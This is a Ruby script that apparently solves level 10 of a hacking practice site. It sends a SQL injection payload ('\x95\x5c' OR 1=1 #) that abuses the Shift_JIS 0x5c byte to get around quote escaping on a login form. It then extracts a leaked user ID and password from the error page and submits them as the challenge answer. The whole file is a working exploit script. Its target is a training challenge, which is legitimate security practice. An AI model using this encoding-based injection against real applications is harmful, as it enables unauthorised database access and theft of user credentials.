# encoding: utf-8
require_relative 'hack_utils'
require 'net/http'

# ShiftJIS 0x5c problem
# display user tables using SQL injection with ShiftJIS '•\'
id ="\x95\x5c' OR 1=1 #"
id.force_encoding('shift_jis')
url = 'http://www.hackerschool.jp/hack/take10.php'
resp  = RestClient.post url, :id => id, :pass => 'abcd'
doc = Nokogiri::HTML(resp.body)
data = doc.css('div.alert-error').first.text
puts data 

id,pass = data.match(/ID:(\w+), PW:(\w+)/).to_a[1,2]
puts "id:#{id}, pass:#{pass}"

HackUtils.post_answer(10, :id => id, :pw => pass)
